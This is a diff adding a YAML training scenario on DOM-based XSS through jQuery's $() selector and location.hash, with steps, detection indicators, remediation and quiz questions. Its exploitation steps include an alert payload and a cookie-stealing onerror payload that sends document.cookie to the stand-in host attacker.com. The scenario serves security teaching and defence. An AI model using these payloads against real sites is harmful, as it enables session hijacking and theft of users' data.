@@ -1,0 +1,90 @@
+# Category: Cross-Site Scripting (XSS)
+name: "DOM XSS in jQuery selector sink using a hashchange event"
+id: "xss-dom-jquery-selector-001"
+category: "xss"
+subcategory: "dom_based"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers DOM-based XSS where jQuery uses the `$()` selector
+  with data from the URL hash (`location.hash`). The attacker can craft a
+  hash value that, when processed by jQuery, leads to script execution.
+  This is often combined with the `hashchange` event.
+
+learning_objectives:
+  - Understand the `$()` selector and its risks with user input
+  - Identify uses of `location.hash` in jQuery selectors
+  - Exploit via a crafted hash fragment
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of jQuery
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Find code that uses `$(location.hash)` or similar"
+    commands:
+      - "# Search for `$(window).on('hashchange', function() { $(location.hash)... })`"
+    expected_output: "Vulnerable code identified"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject payload into the URL hash"
+    commands:
+      - "# Example: http://example.com/page#<img src=x onerror=alert('XSS')>"
+      - "# If jQuery processes the hash, the payload executes"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show unusual hashes"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Exfiltrate data via the hashchange trigger"
+    commands:
+      - "# Payload: #<img src=x onerror='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>"
+    expected_output: "Cookie sent to attacker"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "URLs with HTML tags in hash"
+  log_indicators:
+    - "Web server logs with unusual fragments"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Avoid using user input in jQuery selectors"
+    - "Use `document.querySelector` with safe selectors"
+  long_term:
+    - "Implement CSP to prevent inline script execution"
+    - "Sanitize input before using in selectors"
+
+variables:
+  target_url: "http://example.com/page#PAYLOAD"
+
+assessment_questions:
+  - "How can jQuery selectors be exploited with user input?"
+  - "What is the `hashchange` event and how is it used?"
+  - "Why is `location.hash` dangerous in selectors?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+    title: "OWASP DOM XSS"
+  - url: "https://api.jquery.com/jQuery/"
+    title: "jQuery $() documentation"
